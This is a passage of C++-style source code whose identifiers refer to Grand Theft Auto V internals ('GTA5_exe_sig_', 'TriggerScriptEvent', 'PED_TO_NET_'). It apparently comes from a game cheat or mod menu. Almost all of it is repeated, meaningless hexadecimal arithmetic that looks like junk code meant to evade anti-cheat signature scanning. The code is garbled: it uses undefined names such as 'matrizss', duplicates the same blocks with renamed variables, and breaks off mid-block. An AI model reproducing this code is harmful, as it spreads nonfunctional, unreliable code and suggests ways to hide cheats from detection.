				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				String::GravarString(std::to_string(value), app, key);
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
